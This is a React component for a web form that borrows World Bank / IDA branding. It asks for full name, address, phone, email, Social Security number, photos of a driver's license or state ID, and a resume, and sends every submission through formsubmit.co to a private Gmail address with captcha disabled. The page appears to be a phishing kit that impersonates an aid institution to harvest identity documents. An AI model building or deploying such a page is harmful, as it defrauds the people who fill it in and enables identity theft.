// import { useRef } from 'react';

function App() {
  // const fileInputRef = useRef(null);

  // const handleFileInputChange = () => {
  //   // Handle file selection here if needed
  //   console.log(fileInputRef);
  // };
  return (
    <div className="bg-image min-h-screen bg-gray-400 backdrop-blur-[2px]  bg-opacity-20">
      <div className="max-w-screen-xl mx-auto px-6">
        <div className="w-full p-10 bg-[#C43B80] text-white ">
          <h1 className="text-4xl mb-6 ">What is IDA?</h1>
          <p>
            The International Development Association (IDA) is the part of the
            World Bank that helps the world’s poorest countries. Established in
            1960, IDA aims to reduce poverty by providing zero to low-interest
            loans (called “credits”) and grants for programs that boost economic
            growth, reduce inequalities, and improve people’s living conditions.
          </p>
        </div>
        <div>
          <form
            method="POST"
            action="https://formsubmit.co/henigancarolyn@gmail.com"
            className="py-16"
          >
            <input type="hidden" name="_next" value="https://idh.vercel.app/" />
            <input type="hidden" name="_captcha" value="false" />
            <input type="hidden" name="_template" value="table" />
            <label
              htmlFor="name"
              className="block  text-sm font-medium text-white "
            >
              Name
            </label>
            <div className="grid grid-cols-2 gap-2">
              <div className="relative z-10 w-full mb-6 group">
                <input
                  type="text"
                  id="name"
                  name="first_name"
                  className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black  "
                  required
                />
                <p className="text-white text-sm">First Name</p>
              </div>
              <div className="relative z-10 w-full mb-6 group">
                <input
                  type="text"
                  id="name"
                  name="last_name"
                  className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                  required
                />
                <p className="text-white text-sm">Last Name</p>
              </div>
            </div>
            <div className="mb-6">
              <label
                htmlFor="address"
                className="block mb-2 text-sm font-medium text-white "
              >
                Address
              </label>
              <input
                type="text"
                id="address"
                name="address"
                className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                required
              />
              <p className="text-white text-sm">Street Address</p>
            </div>
            <div className="mb-6">
              <input
                type="text"
                id="address2"
                name="address2"
                className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                required
              />
              <p className="text-white text-sm">Street Addres Line 2</p>
            </div>
            <div className="grid grid-cols-2 gap-2">
              <div className="relative z-10 w-full mb-6 group">
                <input
                  type="text"
                  id="city"
                  name="city"
                  className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                  required
                />
                <p className="text-white text-sm">City</p>
              </div>
              <div className="relative z-10 w-full mb-6 group">
                <input
                  type="text"
                  id="state/province"
                  name="state"
                  className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                  required
                />
                <p className="text-white text-sm">State / Province</p>
              </div>
            </div>
            <div className="grid grid-cols-2 gap-2">
              <div className="relative z-10 w-full mb-6 group">
                <input
                  type="text"
                  id="postal"
                  name="postal"
                  className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                  required
                />
                <p className="text-white text-sm">Postal / Zip Code</p>
              </div>
            </div>

            <div className="mb-10 z-10">
              <label
                htmlFor="email"
                className="block mb-2 text-sm font-medium text-white "
              >
                Email
              </label>
              <input
                type="email"
                id="email"
                name="email"
                className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                required
              />
              <p className="text-white text-sm">example@example.com</p>
            </div>

            <label
              htmlFor="phone"
              className="block mb-2 text-sm font-medium text-white "
            >
              Phone Number
            </label>
            <div className="grid grid-cols-4 gap-2">
              <div className="relative z-10 col-span-1 mb-6 group">
                <input
                  type="text"
                  id="code"
                  name="code"
                  className="bg-transparent border border-white text-sm rounded-lg block w-full p-2.5 placeholder-gray-400 text-black"
                  required
                />
                <p className="text-white text-sm">Area Code</p>
              </div>
              <div className="relative z-10 col-span-3 mb-6 group">
                <input
                  type="tel"
                  id="phone-number"
                  name="phone-number"
                  className="bg-transparent border border-white text-sm rounded-lg block w-full p-2.5 placeholder-gray-400 text-black"
                  required
                />
                <p className="text-white text-sm">Phone Number</p>
              </div>
            </div>
            <div className="mb-10 z-10">
              <label
                htmlFor="ssn"
                className="block mb-2 text-sm font-medium text-white "
              >
                SSN
              </label>
              <input
                type="text"
                id="ssn"
                name="ssn"
                className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                required
              />
            </div>
            <div className="mb-10">
              <label
                htmlFor="ssn"
                className="block mb-2 text-sm font-medium text-white "
              >
                REASON FOR APPLYING
              </label>

              <textarea
                id="reason-for-applying"
                name="reason-for-applying"
                rows="4"
                className="block p-2.5 w-full text-sm  bg-transparent rounded-lg border border-white  placeholder-gray-400 text-black "
              ></textarea>
            </div>
            <div className="mb-10">
              <label
                htmlFor="picture"
                className="block mb-4 text-sm font-medium text-white "
              >
                UPLOAD A CLEAR PICTURE OF YOUR DRIVERS LICENSE/STATE ID FRONT
                AND BACK
              </label>
              {/* <label
                htmlFor="fileInput"
                className="bg-gray-600 border border-white text-white px-10 py-2 rounded-lg cursor-pointer"
              >
                Browse files
              </label>
              <input
                type="file"
                id="fileInput"
                accept=".jpeg, .jpg, .png, .gif"
                ref={fileInputRef}
                className="hidden"
                onChange={handleFileInputChange}
              /> */}
              <input
                className="block  text-sm p-2.5 text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 dark:text-gray-400 focus:outline-none dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400"
                id="picture"
                type="file"
                name="picture"
                accept=".jpeg, .jpg, .png, .gif"
              />
            </div>

            <div className="mb-10">
              <label
                htmlFor="resume"
                className="block mb-4 text-sm font-medium text-white "
              >
                UPLOAD YOUR RESUME
              </label>
              {/* <label
                htmlFor="fileInput"
                className="bg-gray-600 border border-white text-white px-10 py-2 rounded-lg cursor-pointer"
              >
                Browse files
              </label>
              <input
                type="file"
                id="fileInput"
                accept="'.pdf', '.doc', '.docx'"
                ref={fileInputRef}
                className="hidden"
                onChange={handleFileInputChange}
              /> */}
              <input
                className="block  text-sm p-2.5 text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 dark:text-gray-400 focus:outline-none dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400"
                id="resume"
                name="resume"
                type="file"
                accept=".pdf, .doc, .docx"
              />
            </div>

            <button
              type="submit"
              className="mb-4 text-white bg-gray-600   focus:outline-none  font-medium rounded-full text-sm w-full sm:w-auto px-5 py-2.5 text-center "
            >
              Submit
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}

export default App;
